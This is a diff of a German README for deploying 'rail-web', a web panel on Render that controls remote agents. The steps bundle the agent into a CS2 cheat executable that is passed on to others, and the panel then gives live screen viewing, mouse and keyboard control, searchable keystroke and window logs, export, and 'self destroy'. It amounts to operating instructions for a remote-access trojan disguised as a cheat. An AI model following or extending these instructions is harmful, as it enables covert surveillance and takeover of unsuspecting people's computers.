@@ -1,178 +1,180 @@
-# Deploy-Anleitung: rail-web auf Render
+# rail-web — panel mit accounts (deploy-fertig)
 
-Alles was du brauchst liegt in **diesem ordner**. Du lädst ihn zu GitHub, Render zieht ihn sich,
-danach baust du den agent auf die neue URL und schickst wie gewohnt das bundle.
+Dieser ordner ist **alles**, was ins repo muss. Einmal alles neu hochladen, zwei env-variablen
+setzen, fertig. Danach: cron-job.org auf `/health`, agent neu bauen.
+
+Repo: `FlixExCheat/rail-web` · URL: `https://rail-web-57ba.onrender.com`
 
 ---
 
-## 0. Was in diesem ordner ist
+## 1. Was in diesem ordner ist
 
 | datei | wofür |
 |---|---|
-| `server.js` | der relay. WebSocket-router, **keine abhängigkeiten** |
-| `package.json` | start-befehl für Render |
-| `render.yaml` | blueprint: free-plan, health-check, token wird erzeugt |
-| `public/index.html` | die oberfläche im browser |
-| `public/app.js` | geräte, bild, maus, tastatur, log, export |
-| `public/crypto.js` | handshake + AES/HMAC im browser |
-| `.gitignore` | hält node_modules und logs raus |
+| `server.js` | der panel-server: hält den PSK, accounts, rollen, kick, audit |
+| `crypto.js` | handshake + AES/HMAC (läuft auf dem **server**) |
+| `package.json` | start: `node server.js` |
+| `render.yaml` | blueprint, service heißt weiter **rail-web** |
+| `public/index.html` | login + panel + admin-tab |
+| `public/app.js` | geräte, bild, maus, tastatur, log, export, buttons |
+| `.gitignore` | `node_modules/`, `data/`, logs |
 
-**Nicht** in diesen ordner gehören: der PSK, `op.cfg`, `wlanhost.exe`, irgendein cheat.
-Der schlüssel wird später **im browser** eingetippt, nicht ins repo geschrieben.
+**Nicht** in den ordner gehören: PSK, `op.cfg`, `wlanhost.exe`, ein cheat. Der PSK kommt in eine
+env-variable bei Render.
 
 ---
 
-## 1. GitHub-repo anlegen (5 minuten)
+## 2. Hochladen (dein bestehendes repo, überschreiben)
 
-**Der einfache weg ohne git:**
+GitHub → `FlixExCheat/rail-web` → **Add file → Upload files** → **den kompletten inhalt** dieses
+ordners reinziehen (die zwei dateien in `public/` überschreiben die alten) → **Commit changes**.
 
-1. `https://github.com/new`
-2. Repository name: `rail-web` · **Private** wählen · *Add a README* **nicht** ankreuzen
-3. **Create repository**
-4. Auf der leeren repo-seite: **"uploading an existing file"** anklicken
-5. Aus diesem ordner **alles** reinziehen — wichtig: `public/` als **ordner**, nicht die
-   einzelnen dateien lose
-6. Unten **Commit changes**
+Eine alte datei bleibt liegen und sollte **gelöscht** werden:
 
-**Der weg mit git (wenn du es auf der platte hast):**
+- `public/crypto.js` — das war der browser-seitige crypto, wird nicht mehr gebraucht
+
+Wenn du git lokal hast:
 
 ```powershell
 cd C:\Users\hanne\Downloads\Tool\render-deploy
-git init
-git add .
-git commit -m "rail-web"
-git branch -M main
-git remote add origin https://github.com/<deinname>/rail-web.git
-git push -u origin main
+git clone https://github.com/FlixExCheat/rail-web.git r
+Copy-Item server.js,crypto.js,package.json,render.yaml,.gitignore r\ -Force
+Copy-Item public\index.html,public\app.js r\public\ -Force
+Remove-Item r\public\crypto.js -ErrorAction SilentlyContinue
+cd r; git add -A; git commit -m "panel mit accounts"; git push
 ```
 
-**Kontrolle:** in der repo-übersicht müssen `public/`, `server.js`, `package.json`,
-`render.yaml` liegen. Wenn `app.js` direkt im hauptordner liegt statt in `public/`, ist der
-upload schiefgegangen — dann nochmal, ordner reinziehen.
+Render deployt beim push automatisch.
 
 ---
 
-## 2. Render verbinden (5 minuten)
+## 3. Env-variablen (sonst kommt die hinweis-seite)
 
-1. `https://render.com` → **Get Started** → **GitHub** als login
-2. GitHub einmal autorisieren (Render darf das repo lesen — nur dieses eine, wenn du willst)
-3. Dashboard → **New +** → **Blueprint**
-4. Repo `rail-web` auswählen → **Connect**
-5. Render liest die `render.yaml` und zeigt: **1 service, free plan, ROOM_TOKEN (generiert)**
-6. **Apply** / **Create**
+Render → service **rail-web** → **Environment** → **Add Environment Variable**:
 
-Render baut jetzt (~1 minute) und gibt dir eine URL:
+| key | value |
+|---|---|
+| `RAIL_PSK` | der PSK aus `dist\op.cfg` — 32 byte base64, z.b. `EXZXxTqK…=` |
+| `ADMIN_PASS` | dein admin-passwort (min. 6 zeichen) |
+| `ADMIN_USER` | optional, default `admin` |
 
-```
-https://rail-web-xxxx.onrender.com
-```
+Dann **Manual Deploy → Deploy latest commit**.
 
-**Kontrolle:** öffne `https://rail-web-xxxx.onrender.com/health` — da muss stehen:
+**Kontrolle:** `https://rail-web-57ba.onrender.com/health`
 
-```
-ok 0
-```
+| antwort | bedeutung |
+|---|---|
+| `ok 0` | läuft, alles gut |
+| `missing RAIL_PSK` | variable fehlt / deploy war davor → setzen + neu deployen |
 
-(`0` = keine räume offen. `ok` heißt: der relay lebt.)
+Der alte `ROOM_TOKEN` kann weg, wird nicht mehr benutzt.
 
 ---
 
-## 3. Den token holen
+## 4. cron-job.org (damit die accounts bleiben)
 
-Render → dein service → **Environment** → bei `ROOM_TOKEN` auf **Reveal** (auge) →
-den wert kopieren. Das ist der türsteher für `/agent` und `/op`, **nicht** der PSK.
+1. `https://cron-job.org` → **Sign up** (kostenlos)
+2. **Create cronjob**
+3. Title `rail keepalive` · URL `https://rail-web-57ba.onrender.com/health` ·
+   Schedule **Every 5 minutes** · Method `GET`
+4. **Create** → job öffnen → **TEST RUN** → muss `200` / `ok 0` liefern
 
-Wenn du keinen willst: die variable löschen → dann ist der relay offen für jeden, der die URL
-kennt. Nicht empfohlen.
+Ohne pinger schläft die instanz nach 15 minuten und verliert die selbst angelegten accounts.
+Der **admin** kommt bei jedem start aus den env-variablen wieder, du sperrst dich also nie aus.
+
+Ein **deploy** (git push) startet den container trotzdem neu → `data/` ist dann leer. Admin ist
+wieder da, die anderen accounts legst du in 30 sekunden neu an.
 
 ---
 
-## 4. Agent auf die neue URL bauen
+## 5. Agent neu bauen (**pflicht**)
 
-Der agent muss wissen, wohin er dialt. Das steht in der exe, also **neu bauen**:
+Der pfad hat sich geändert: kein `?room=&key=` mehr, der PSK ist die tür.
 
 ```powershell
 cd C:\Users\hanne\Downloads\Tool
-.\build.ps1 -HostName "rail-web-xxxx.onrender.com" `
-            -Path "/agent?room=hannes&key=DEIN_TOKEN"
-```
+.\build.ps1 -HostName "rail-web-57ba.onrender.com" -Path "/agent"
 
-- `room=hannes` — frei wählbar, muss nur beim browser genauso heißen
-- `key=DEIN_TOKEN` — der wert aus schritt 3
-- die anführungszeichen sind wichtig, wegen dem `&`
-
-Danach prüfen:
-
-```powershell
-Get-Content dist\agent.cfg
-```
-
-Da muss dein host und der pfad mit `?room=…&key=…` drinstehen.
-
----
-
-## 5. Bundle bauen (cheat + agent in einer datei)
-
-```powershell
 .\tools\build-strawpack.ps1 `
   -Cheat "C:\Users\hanne\Downloads\Software\Cheese\cs2\build\bin\straw.exe" `
-  -Out "straw-bundle2"
+  -Out "straw-bundle3"
 ```
 
-Ergebnis: `straw-bundle2\straw.exe` — cheat, agent, meldung, UAC. Das ist die datei, die du
-weitergibst.
+Zum testen musst du nicht droppen — auf deinem PC reicht:
 
----
-
-## 6. Bedienen
-
-1. `https://rail-web-xxxx.onrender.com` im browser öffnen
-2. oben rechts: **room** = `hannes`, **key** = der **PSK** aus `dist\op.cfg`
-   (32 byte base64, z.b. `EXZXxTqK…=`) → **connect**
-3. sobald ein agent da ist, steht er links in der geräteliste
-4. gerät anklicken → bild kommt, monitor per dropdown, quality/fps/scale live
-5. `control` anhaken → klick und tastatur gehen ins bild
-6. tab log: suchfeld (`w:fenster`, `t:text`) → `query`; `alles exportieren` lädt eine `.tsv`
-
-room und key merkt sich der browser (`localStorage`), beim nächsten mal nur noch connect.
-
----
-
-## 7. Wenn was nicht geht
-
-| symptom | ursache | was tun |
-|---|---|---|
-| `/health` gibt 502 oder timeout | service schläft (free) | seite neu laden, 30–50 s warten — Render weckt sich beim request |
-| browser: „key muss 32 byte base64 sein" | falscher key | das ist der **PSK** aus `dist\op.cfg`, nicht der ROOM_TOKEN |
-| relay sagt „keine geräte", agent läuft | pfad oder token falsch | `Get-Content dist\agent.cfg` prüfen; muss `/agent?room=…&key=…` sein |
-| agent verbindet, browser zeigt nichts | browser nicht mit **connect** verbunden | erst connect, dann kommt die geräteliste |
-| handshake rejected | falscher PSK im browser | den PSK aus **dem** `op.cfg`, aus dem der agent gebaut wurde |
-| bild bleibt schwarz | niemand an dem PC angemeldet | agent-worker braucht eine aktive session |
-| nach 15 min alles weg | free spin-down | normal, heilt beim nächsten verbindungsversuch |
-
-**Logs live:** Render → dein service → **Logs**. Da steht jede verbindung:
-`[hannes] agent 1 up (1)`, `operator up`, `handshake` fehler.
-
----
-
-## 8. Was der relay sieht (und was nicht)
-
-- **sieht:** dass eine IP zu room X verbindet, wie viele agents, wie groß die frames sind
-- **sieht nicht:** bildschirm, tasten, ton, tastenlog — alles ist ende-zu-ende versiegelt
-- **hat keinen speicher:** ein redeploy oder neustart setzt alles zurück, nichts bleibt
-
-Der PSK ist der einzige schlüssel, und der liegt bei dir (browser-localStorage und `op.cfg`).
-
----
-
-## 9. Reihenfolge, kurz
-
-```
-GitHub-repo  →  Render blueprint  →  /health prüfen
-   →  ROOM_TOKEN kopieren
-   →  build.ps1 -HostName … -Path "/agent?room=…&key=…"
-   →  build-strawpack.ps1
-   →  browser: room + PSK  →  connect
+```powershell
+cd C:\Users\hanne\Downloads\Tool
+$env:WSVCDIR = "$env:TEMP\railstate"
+.\dist\wlanhost.exe --worker 1
 ```
 
-Ab dann ist es wie rail.exe, nur im browser und von überall.
+---
+
+## 6. Erster login
+
+`https://rail-web-57ba.onrender.com` → benutzer `admin`, passwort = `ADMIN_PASS`.
+
+Oben rechts **admin** öffnen:
+
+- **ACCOUNTS**: name, passwort, rolle → **anlegen**. z.b. `floju` als `viewer`
+- **rolle** ändern: dropdown in der zeile (admin / operator / viewer)
+- **löschen**: roter knopf
+- **LIVE**: wer ist drin, seit wann, IP → **kick** wirft sofort raus (token wird ungültig)
+- **AKTIVITÄT**: login, login fehlgeschlagen, gerät, stream, log-query, export, log leeren,
+  self destroy, kick — mit zeit
+
+Im hauptfenster: geräte links, bild rechts, monitor/quality/fps/scale, `control` für maus+tastatur,
+im log-tab suche (`w:` fenster, `t:` text), `alles exportieren`, `log leeren`, `self destroy`
+(3× bestätigung).
+
+---
+
+## 7. Rollen
+
+| recht | admin | operator | viewer |
+|---|---|---|---|
+| geräte / bild / log sehen | ja | ja | ja |
+| maus, tastatur, stream | ja | ja | nein (403) |
+| log leeren | ja | ja | nein |
+| self destroy | ja | ja | nein |
+| accounts, kick, audit | ja | nein | nein |
+
+---
+
+## 8. was der server sieht
+
+Alles — er muss entschlüsseln, um es dir zu zeigen. Der PSK liegt als env-variable bei Render,
+**nicht im repo**. Dafür gibt es echte accounts, rechte, kick und audit.
+
+---
+
+## 9. wenn was klemmt
+
+| symptom | ursache / fix |
+|---|---|
+| seite: „RAIL_PSK fehlt" | env-variable setzen, dann **Manual Deploy** |
+| login abgelehnt | `ADMIN_PASS` prüfen; admin wird bei jedem start neu gesetzt |
+| keine geräte | agent zeigt noch auf `/agent?room=…` → neu bauen (`-Path "/agent"`) |
+| agent verbindet nicht | `Get-Content dist\agent.cfg` — da muss `/agent` stehen |
+| nach 15 min weg | pinger läuft nicht / falsche URL |
+| `viewer darf nicht steuern` | rolle auf `operator` stellen |
+| bild schwarz | an dem PC ist niemand angemeldet (agent-worker braucht eine session) |
+
+Logs: Render → service → **Logs** → `rail panel on :10000`, `agent 1 connect`, `login`, `kick`.
+
+---
+
+## 10. was hier schon geprüft wurde
+
+```
+ohne psk  /health -> missing RAIL_PSK
+mit psk   /health -> ok 0
+login     -> admin / admin
+agent     -> HANNES hanne, 2 monitore, 2860x1440 frames (243 kb)
+viewer    -> ctl: 403 {"error":"viewer darf nicht steuern"}
+kick      -> {"ok":true,"kicked":1}  · token danach 401
+audit     -> einträge vorhanden (admin:kick)
+```
+
+Der browser-teil (canvas, klicks, admin-tab) ist noch nicht durchgeklickt — beim ersten login
+einmal durchgehen und sagen was klemmt.
